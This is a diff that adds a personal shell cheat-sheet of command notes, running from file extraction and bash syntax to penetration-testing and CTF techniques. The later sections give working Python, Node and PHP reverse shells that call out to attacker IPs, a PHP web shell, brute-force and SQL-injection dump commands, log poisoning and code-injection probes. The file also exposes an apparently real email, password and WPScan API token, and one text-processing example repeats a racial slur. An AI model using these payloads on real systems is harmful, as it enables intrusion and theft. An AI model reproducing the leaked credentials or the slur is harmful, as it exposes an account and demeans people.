@@ -1,0 +1,432 @@
+#------------------------------Tools Syntax------------------------------#
+extract(){
+echo "unzip <filename>"
+	echo "\t-q : quite"
+	echo "\t-d : destination path"
+	echo "\t-P : to specify password"
+echo "unrar e <filename>"
+echo "unrar e <filename> /destination/path : extract to different path"
+	echo "\tx : Extract file with directory structure"
+	echo "\tl : list rar file content"
+	echo "\tt : check integrity"
+echo "tar -xvf <filename.rar>"
+	echo "\t-x : extract a tar ball"
+	echo "\t-v : verbose output"
+	echo "\t-f : specify an archive or a tarball filename"
+	echo "\t-z : to extract tar.gz"
+	echo "\t-j : to extract tar.bz2"
+	echo "\tNote :  modern Linux system with the latest version of GNU/tar, the compression format is automatically detected."
+	echo "\ttar -xvf file.tar.gz"
+	echo "\ttar -xvf file.tar.bz2"
+	echo "\ttar -xvf file.tar"
+}
+
+#------------------------------Linux Built-in tools------------------------------#
+string-manipulation(){
+print '
+using sed or awk or any other tool, extract "echo getenv('PATH');" from "Example: echo getenv('PATH');"
+echo "Example: echo getenv('PATH');" | sed 's/^Example: //'
+echo "Example: echo getenv('PATH');" | awk -F": " '{print $2}'
+'
+}
+
+
+
+ghauri-notes(){
+print '
+ghauri -r req.sql --batch --current-db
+ghauri -r login.sql --batch -D clover -T users --dump
+'
+}
+
+sudoNotes(){
+echo "
+/etc/sudoers              -> sudo -l
+
+kol     ALL=(ALL:ALL) ALL -> (ALL : ALL) ALL
+kol     ALL=(ALL:ALL) /usr/bin/rm -> (ALL : ALL) /usr/bin/rm : Need to provide password of the logged-in user.
+kol     ALL=(ALL:ALL) NOPASSWD: /usr/bin/rm -> (ALL : ALL) NOPASSWD: /usr/bin/rm : No password is required.
+kol     ALL=(Alex) NOPASSWD: /usr/bin/vim -> (Alex) NOPASSWD: /usr/bin/vim : sudo -u <username> command
+kol     ALL=(Alex:employee) NOPASSWD: /usr/bin/vim -> (Alex : employee) NOPASSWD: /usr/bin/vim : sudo -u Alex -g employee vim (This command allows John to run the apt update command with Alex's privileges and under the group employee.)
+"
+}
+
+
+LinuxUser(){
+echo "Create User : sudo useradd -m -s /bin/zsh <username> && sudo passwd <username>"
+echo "Delete User : sudo deluser --remove-home <username> / sudo userdel -rf <username>"
+echo "Create Group : sudo groupadd <groupname>"
+echo "Assign user to grp : sudo usermod -aG <groupname> <username>"
+echo ""
+echo "Another command to achieve the same : adduser : Its more interactive than useradd"
+echo "Syntax : sudo adduser <username> / sudo adduser <username> --shell /bin/zsh"
+echo "Notes : Prompts for password in a interactive way."
+}
+
+WindowsUser(){
+echo "HELP : 
+      Brief Help : net user /?
+      Detailed Help : net help user"
+echo ""
+echo "
+Create User : net user jon /add
+Create User with visible passwd : net user jon p@ssw0rd /add
+Create User with prompt password : net user jon * /add
+
+Setting a password for user, who's password was not set while creation : 
+- net user jon p@ssw0rd
+- net user jon *
+
+Delete user : net user jon /delete
+Disable user : net user jon /active:no
+Enable user account : net user jon /active:yes
+
+User database : net accounts
+/FORCELOGOFF : {MINUTE | NO} -> Force user to log off, default is no.
+/MINPWLEN : length -> minimum passwd length, 0 -> 14, default is 6.
+/MAXPWAGE : {days | UNLIMITED} -> Max days for a password to be valid, 1 -> 999
+/MINPWAGE : {days} -> Min days to pass for the password to change. Cant be more than MAXPWAGE. 1 ->999
+/UNIQUEPW : number -> Password have to be different from the last passwords, Max value is 24.
+
+View Local Groups : net localgroup
+Create Local Groups : net localgroup <groupname> /add
+Add User to the group : net localgroup <groupname> <username> /add
+View Single group : net localgroup <groupname>
+Delete user from group : net localgroup <groupname> <username> /del
+Delete localgroup : net localgroup <groupname> /del
+"
+	   
+}
+
+found-id_rsa(){
+echo "chmod 600 id_rsa"
+echo "ssh2john id_rsa > id_rsa.hash"
+}
+
+# Transform Vertical lines to Horizontal lines
+ver2horLines(){
+echo -E "
+Maintain Spaces :
+	cat constantlyhating.html| grep -w -i -o nigga | tr '\n' ' '
+	cat constantlyhating.html | grep -w -i -o "nigga" | tr '\n' ' ' | sed 's/ $//'
+	cat constantlyhating.html | grep -w -i -o "nigga" | paste -s -d ' '
+	cat constantlyhating.html | grep -w -i -o "nigga" | awk '{printf "%s ", $0}'
+
+Without Spaces :
+	cat constantlyhating.html | grep -w -i -o "nigga" | tr -d '\n'
+	cat constantlyhating.html | grep -w -i -o "nigga" | paste -sd ''
+	cat constantlyhating.html | grep -w -i -o "nigga" | awk '{printf "%s", $0}'
+"
+}
+# Transform Horizontal lines to Vertical lines
+hor2ver(){
+print '
+#!/bin/bash
+
+# Example horizontal list of ports
+ports="80 8081"
+
+# Using tr
+echo "Using tr:"
+echo "$ports" | tr ' ' '\n'
+
+# Using awk
+echo "Using awk:"
+echo "$ports" | awk "{for(i=1;i<=NF;i++) print $i}"
+
+# Using sed
+echo "Using sed:"
+echo "$ports" | sed 's/ /\n/g'
+
+# Using printf
+echo "Using printf:"
+printf "%s\n" $ports
+'
+}
+
+file-permission(){
+echo "View file permission in octal"
+echo "stat -c '%a %n' filename"
+
+echo "View just file permission in both numeric and standard"
+echo "stat -c '%A (%a) %n' filename"
+}
+
+
+
+
+# Web Fuzzers
+web-fuzzer(){
+print '
+ffuf -u "http://$IP/FUZZ" -w ~/tools/SecLists/Fuzzing/XSS-Fuzzing -fs 0 -fc 404,403
+	-f[s,c,l] : filters
+	-m[s,c,l] : matchers
+wfuzz -c -z file,tools/SecLists/Fuzzing/XSS-Fuzzing --hh 40060 "http://offsecwp/?xss=FUZZ"
+gobuster dir -u http://$IP/ -w <wordlist_file> -t 100 -x .php,.txt'
+}
+
+username_fuzzer(){
+print '
+ffuf -w tools/SecLists/Usernames/top-usernames-shortlist.txt -X POST -d "username=FUZZ&&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://192.168.0.101:8080/ -fr "Invalid username."
+'
+}
+#---------------------------Service Related---------------------------#
+docker-installation(){
+print '
+sudo apt undate
+sudo apt install -y docker.io
+sudo systemctl enable docker --now
+sudo usermod -aG docker $USER
+docker version
+'
+}
+
+#---------------------------Python Syntax---------------------------#
+
+python-file-handling(){
+print '
+f1 = open("codes.txt", "r") # to open the file in read mode
+
+with open('example.txt', 'r') as file: # to open file
+    lines = file.readlines()
+
+code = f1.readlines() # reads the entire file at once.
+code = f1.readline() # reads one line at a time.
+
+f1.close() # close the file
+for c in code:
+	d1 = c.strip() # replace white spaces
+	for i in range (10,99): # looping from 10 to 99
+	result = hashlib.md5(to_crack.encode()) # store md5 hash into result variable
+	if result.hexdigest() == "daab260727e470e56e77ec22e8f3d413":
+'
+}
+
+python-for(){
+print '
+for line in files: # to read through files
+print(line.strip())
+for i in range(5): # loop through range
+for i in range(10,99):
+# Iterating Over a String (Character by Character)
+for char in "hello":
+print(char)
+'
+}
+
+
+
+#---------------------------Working with BASH syntax---------------------------#
+
+bash-string-concatenation(){
+print '
+#!/bin/bash
+
+# Define the strings
+str1="Hello"
+str2="World"
+
+# Method 1: Direct Concatenation
+str3="$str1$str2"
+echo "Direct Concatenation: $str3"  # Output: HelloWorld
+
+# Method 2: Using Curly Braces
+str4="${str1}${str2}"
+echo "Using Curly Braces: $str4"  # Output: HelloWorld
+
+# Method 3: With Additional Text
+str5="$str1, $str2!"
+echo "With Additional Text: $str5"  # Output: Hello, World!
+
+# Method 4: Using += Operator
+str1+=" $str2"
+echo "Using += Operator: $str1"  # Output: Hello World
+'
+
+}
+
+# Bash IF Statement - Comparing 2 string
+bash-if-string(){
+print '
+if [ "$(cat http.port)" = "" ];then
+	#processing
+else'
+}
+# Bash IF Statement - Comparing 2 integer
+bash-if-integer(){
+print '
+if [ "$(cat http.port)" -eq "" ];then
+	#processing
+else'
+}
+bash-for(){
+print 'for i in {0..100}; do echo $i; done >> numbers.txt'
+}
+bash-for-files(){
+print '
+# Does not work if the lines have spaces in it.. use bash-for-files-while for it.
+for line in $(cat filename.txt); do
+    echo "$line"
+done'
+}
+bash-for-files-while(){
+print '
+while IFS= read -r line; do
+    echo "$line"
+done < filename
+
+OR
+while IFS= read -r line; do echo "$line"; done < filename
+'
+}
+
+extract-specific-line-from-file(){
+print "
+single line : sed -n 'LINE_NUMBERp' OR awk 'NR==LINE_NUMBER'
+single line but not continous : sed -n -e 'LINE1p' -e 'LINE2p' -e 'LINE3p' OR awk 'NR==LINE1 || NR==LINE2 || NR==LINE3'
+Range of lines : sed -n 'START_LINE,END_LINEp' OR awk 'NR>=START_LINE && NR<=END_LINE'"
+}
+
+#------------------------------CTF/Bug Bounty------------------------------#
+steganography-Toolkit(){
+print '
+sudo docker run -v $(pwd):/data -it <imgage ID> /bin/bash
+'
+}
+
+subdomain_enum(){
+print '
+go_subdomain() --> allCustomCommand : Works fine
+ffuf_subdomain() --> allCustomCommand : Needs some tweeking
+'
+}
+
+wpscanAccountDetails(){
+print '
+Email : lojoxa1842@dovinou.com
+Pass : Lambo@1234
+API : OftY8A0KkPZHlJZRnUs2QpCZpvy4Na0uyt6mMvdS0o0
+'}
+
+wpscan-notes(){
+print 'wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive --api-token OftY8A0KkPZHlJZRnUs2QpCZpvy4Na0uyt6mMvdS0o0
+wpscan --url "http://$1/" -e --ignore-main-redirect --force | tee wpscan.$2
+For password attack :
+cewl -m 6 -w drift.txt http://10.0.2.13 : to generate password list of minimum 6 character long.
+wpscan --url http://10.0.2.13 --detection-mode aggressive -e u -P drift.txt
+'
+}
+userAgent-fuzzing(){
+print 'ffuf -u "http://192.168.0.101/robots.txt" -H "User-Agent: FUZZ" -w ~/tools/SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt -c
+
+Confirming :
+
+curl -k -s "http://192.168.0.101/robots.txt" -H "User-Agent: BaiDuSpider"
+'
+}
+hydra-for-basicAuth(){
+print '
+hydra -l admin -P ~/tools/rockyou.txt -f 192.168.0.105 http-get /inferno/ -t 64
+'
+}
+
+found-lfi(){
+print '
+Try log poisoning attack.
+Some of the files are in log.poison.txt
+'
+cat ~/tools/wordlist/log.poison.txt
+}
+
+#------------------------------Reverse Shells------------------------------#
+
+# Python reverse shell
+py-rev-shell(){
+IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
+
+# random port generate.
+PORT=$(shuf -i 2000-65000 -n 1)
+
+echo "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+echo ""
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+echo ""
+echo "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+}
+
+# NodeJS Reverse Shell
+node-rev-shell(){
+echo "echo \"require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')\" > /var/tmp/offsec.js ; node /var/tmp/offsec.js"
+}
+
+# PHP reverse shell
+php-rev-shell(){
+
+print '<?php echo system($_GET["cmd"]);?>'
+echo "<?php echo shell_exec('id');?>"
+echo ""
+echo "Not Succeded yet with this payloads :"
+print '<?php$output = shell_exec('id');echo "<pre>$output</pre>";?>'
+echo ""
+echo "Reverse Shell :"
+print '<?php$output = shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.15 800 >/tmp/f");echo "<pre>$output</pre>";?>'
+
+}
+
+# Set target system after initial foothold
+after_initial_foothold(){
+print "which python & which python3"
+print "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+print "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+print "Ctrl + z"
+print "stty raw -echo;fg"
+print "export TERM=xterm"
+# If bash shell does not get activate do
+print "exec bash --login"
+}
+
+#--------------Code Injection--------------#
+php-code-injection(){
+echo " # Balacing the payload might be needed
+
+phpinfo();
+print_r($_SERVER); (can be used to reveal server-related information)
+var_dump($_ENV); (shows environment variables)
+print_r(get_defined_vars());
+print_r(get_loaded_extensions());
+print_r(get_defined_functions());
+print_r(ini_get_all());
+echo shell_exec('whoami');
+print_r(posix_getpwuid(posix_geteuid()));
+echo disk_free_space('/');
+echo get_current_user();
+echo php_uname();
+echo apache_get_version();
+echo getenv('PATH');
+"
+}
+
+
+
+
+#--------------Some custom bash scipt--------------#
+ping_swipe(){
+echo "for ip in $(seq 1 254); do ping -c 1 192.168.56.$ip; done"
+}
+
+port_scan(){
+print 'for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.<ip> $i 2>&1; done | grep -v "Connection refused"'
+}
+
+# Deserialization
+
+node-deserialization()
+{
+echo '
+- Make sure to have "Node", "NPM" and "node-serialize" module installed.
+- Compile the code. Syntax : node file.js
+- Some compiled payload :
+'
+cat $HOME/Organize/Platform/WebApp/Deserialization/node-deserialization-payload.txt
+
+}
